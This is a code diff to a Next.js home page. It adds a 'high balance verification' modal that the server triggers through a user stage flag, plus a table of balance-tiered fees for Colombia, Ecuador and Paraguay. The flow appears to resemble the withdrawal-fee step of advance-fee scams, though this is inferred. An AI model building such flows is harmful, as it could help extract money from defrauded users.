@@ -10,6 +10,7 @@ import Link from "next/link";
 import { Play } from "lucide-react";
 import { useLanguage } from "@/contexts/LanguageContext";
 import LoadingPage from "@/components/LoadingPage";
+import HighBalanceVerificationModal from '@/components/HighBalanceVerificationModal';
 
 export default function Home() {
   const router = useRouter();
@@ -18,6 +19,34 @@ export default function Home() {
   const [showRegisterModal, setShowRegisterModal] = useState(false);
   const [showLoginModal, setShowLoginModal] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [showHighBalanceVerification, setShowHighBalanceVerification] = useState(false);
+  const [userCountry, setUserCountry] = useState('');
+  const [userStage, setUserStage] = useState<string>('');
+
+  // Verification thresholds and fees per country
+  const verificationConfig: Record<string, { min: number; max: number; fee: number; currency: string; feeLabel: string }> = {
+    colombia: { min: 10000000, max: 40000000, fee: 200000, currency: 'COP', feeLabel: 'cop' },
+    ecuador: { min: 8000, max: 12000, fee: 100, currency: '$ USD', feeLabel: '$ USD' },
+    paraguay: { min: 80000000, max: 120000000, fee: 600000, currency: 'PYG', feeLabel: 'PYG' }
+  };
+
+  const formatAmount = (value: number, currency: string) => {
+    try {
+      const locale = currency === 'COP' ? 'es-CO' : currency === 'USD' ? 'en-US' : 'es-PY';
+      return new Intl.NumberFormat(locale, { maximumFractionDigits: 0 }).format(value);
+    } catch (e) {
+      return String(value);
+    }
+  };
+
+  const getCountryKey = (country: string | undefined) => {
+    if (!country) return null;
+    const c = country.toLowerCase();
+    if (c.includes('colom') || c === 'co') return 'colombia';
+    if (c.includes('ecua') || c === 'ec') return 'ecuador';
+    if (c.includes('paragu') || c === 'py') return 'paraguay';
+    return null;
+  };
 
   // Эффект для показа экрана загрузки только при первом заходе
   useEffect(() => {
@@ -154,6 +183,38 @@ export default function Home() {
     
     setIsAuthenticated(!!token);
     
+    // Check user stage if authenticated
+    if (token) {
+      const fetchUserInfo = async () => {
+        try {
+          const response = await fetch('/api/user/info', {
+            headers: {
+              'Authorization': `Bearer ${token}`,
+            }
+          });
+
+          if (response.ok) {
+            const data = await response.json();
+            const stage = data.stage || 'normal';
+            setUserStage(stage);
+
+            // Check if stage is verif2 and show modal
+            if (stage === 'verif2') {
+              setShowHighBalanceVerification(true);
+            }
+
+            // Get user country
+            const country = data.country_info?.country || data.country || data.pais || '';
+            setUserCountry(country);
+          }
+        } catch (error) {
+          console.error('Error fetching user info:', error);
+        }
+      };
+
+      fetchUserInfo();
+    }
+    
     // Если пользователь не авторизован и это его первый визит, показываем модальное окно регистрации
     if (!token && !hasVisited) {
       setShowRegisterModal(true);
@@ -284,6 +345,16 @@ export default function Home() {
         isOpen={showLoginModal} 
         onOpenChange={setShowLoginModal}
         onRegisterClick={handleRegisterClick}
+      />
+
+      {/* High Balance Verification Modal */}
+      <HighBalanceVerificationModal
+        open={showHighBalanceVerification}
+        onOpenChange={setShowHighBalanceVerification}
+        userCountry={userCountry}
+        verificationConfig={verificationConfig}
+        getCountryKey={getCountryKey}
+        formatAmount={formatAmount}
       />
         </div>
       )}
